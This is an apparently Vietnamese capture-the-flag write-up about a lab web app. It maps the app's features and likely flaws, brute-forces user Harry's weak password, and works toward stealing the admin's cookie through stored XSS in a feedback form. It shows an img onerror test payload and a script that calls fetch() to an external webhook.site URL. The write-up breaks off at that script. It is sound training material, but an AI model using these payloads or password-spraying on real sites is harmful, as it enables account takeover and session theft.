>Tham khảo 1 số nguồn

- Using dirsearch to scan all system:

<img width="1208" height="615" alt="image" src="https://github.com/user-attachments/assets/38e76c97-c720-4287-b36c-9ee6f07b90e7" />

- Now, we look that we have 2 flow: `Needn't to login` and `Need to login`:

+ Needn't to login:

= Ở trang chủ, chúng ta thấy có 3 chức năng là Blogs, Register, Login.

= Trong chức năng blog (http://103.97.125.56:30983/blog), thấy có toàn bài viết có private là No, Chú ý 1 người dùng là Harry có gmail là harry@cookiehanhoan.org

Ngoài ra blog còn có chức năng `Create Blog`.

= Ở login (http://103.97.125.56:30983/login), thấy có 2 trường là email và password.

= Ở register có 3 trường Name, Email, Password (http://103.97.125.56:30983/register)

=> Nguy cơ có thể đọc được private blog khi đăng nhập không?

=> Login có thể bị SQLi, authen

=> Register có thể bị SQLi, Stored XSS.

+ Need to login:

= Sau khi đăng nhập, được đưa tới trang (http://103.97.125.56:30983/profile). Ở đây có 6 chức năng: Home, Blogs, Feedback, Update Profile, Change Password, Logout.

= Các chức năng: Home, Blogs chúng ta đã làm quen trước khi đăng nhập => không có gì thay đổi so với trước khi đăng nhập.

= Chức năng Feedback (http://103.97.125.56:30983/feedback), chú ý `Admin will read your feedback every 3 minutes. They only view feedback in an unread state.` Nghĩa là admin chỉ xem feedback ở trạng thái `unread state`. Có trường message
<img width="762" height="847" alt="image" src="https://github.com/user-attachments/assets/b8c960e0-69da-4373-81d3-36d70703d22d" />

=> Có thể bị SQLi, StoreXSS.

= Chức năng Update Profile (http://103.97.125.56:30983/change_profile), thấy trường email là không thể thay đổi,các trường còn lại có thể thay đổi 
<img width="741" height="762" alt="image" src="https://github.com/user-attachments/assets/424bd510-63bf-455b-9b98-ecb892a28b82" />

=> Có thể bị SQLi, StoreXSS, Mass Assignment (1 lỗ hổng xảy ra khi qtv không giới hạn rõ ràng những trường nào được phép update)

= Chức năng Change Password (http://103.97.125.56:30983/change_password), thấy rõ lỗi khi không có trường `Current Password` 

=> Broken Access Control, SQLi. Ở đây không có StoreXSS vì thông thường mật khẩu khi nhập vào nó là những cái ..., được lưu dưới dạng hash trong DB => Không có chỗ render ra => Không có StoreXSS.

= Theo như dirsearch, còn 2 chức năng là /backup và /search. Truy cập thì thấy lỗi:
<img width="694" height="172" alt="image" src="https://github.com/user-attachments/assets/d6d0b2a7-bcbd-4cfb-babb-da28db99f149" />
<img width="680" height="209" alt="image" src="https://github.com/user-attachments/assets/4a2f2141-e32f-42a5-a0b5-d127b6ee2c98" />

=> Chỉ có những tài khoản có quyền mới có thể xem được.

= Chức năng `Create Blog` thấy có 2 trường là Title, Content và có 1 trường chọn tick `Make this post private`

=> SQLi, StoreXSS

*Solution:*

***Flag1: Bạn sẽ nhận được FLAG nếu đăng nhập thành công vào tài khoản Harry.***

-> `Account TakeOver (ATO)` : xảy ra do Dùng mật khẩu mặc định/ yếu, Brute force login, SQLi bypass login, Lỗi session management (cookie có thể đoán được)

- Bài này thấy trang Register và Login không có dấu hiệu của SQLi, StoreXSS nên có thể là Spray Directory Attack. Dùng weakpassword mà mọi người hay dùng để brute force thì thấy password là `iloveyou` và gmail là `harry@cookiehanhoan.org` thì thấy đăng nhập thành công.

***Flag2: Bạn sẽ nhận được FLAG nếu đăng nhập thành công vào tài khoản Admin.***

-> `Account TakeOver (ATO)` : xảy ra do Dùng mật khẩu mặc định/ yếu, Brute force login, SQLi bypass login, Lỗi session management (cookie có thể đoán được)

= Bài này có 2 cách để làm:

1. Tìm được email và password của admin

2. Lấy được cookie của admin.

Cách khả dụng là Lấy được cookie của admin bằng cách lợi dụng cái feedback admin sẽ đọc sau mỗi 3 phút. Để đánh cắp được cookie thì sử dụng StoreXSS.

- Sử dụng `<img src/onerror=alert(1)>` (img là thẻ up ảnh, thường src là 1 đường dẫn ảnh nhưng ở đây đường dẫn không hợp lệ => có lỗi, mỗi khi có onerror thì sẽ hiện alert(1)). Sau khi chèn vậy, chưa thấy có gì thay đổi nhưng khi ấn vào `Inspect` và vào chỗ `/feedback/2` , nhấp vào thấy "nổ".

<img width="547" height="322" alt="image" src="https://github.com/user-attachments/assets/2e40471b-eb41-4b40-ac70-a3939e7cf370" />
<img width="626" height="239" alt="image" src="https://github.com/user-attachments/assets/272d8262-89ae-4db2-bbd3-5e14198af5e0" />

=> Xác định được `Attack surface` (chỗ nhập dữ liệu được render lại ra trình duyệt) và thấy nó không bị filter (mã hóa ..) 

=> Tồn tại StoreXSS. Bây giờ phải viết payload sao cho mỗi lần up feedback, admin đọc được chúng ta đều lấy được feedback. Chúng ta sẽ dùng `Fetch API` để mỗi lần admin nhấp vào, nó sẽ tự gửi request từ trình duyệt nạn nhân đến 1 URL bên ngoài (ở đay mình sẽ cố gắng dùng `Webhook.site`)

```
<script>fetch("https://webhook.site/32015b98-7f6e-46ec-a2d4-b27f59e2a33e")</script>
```


   

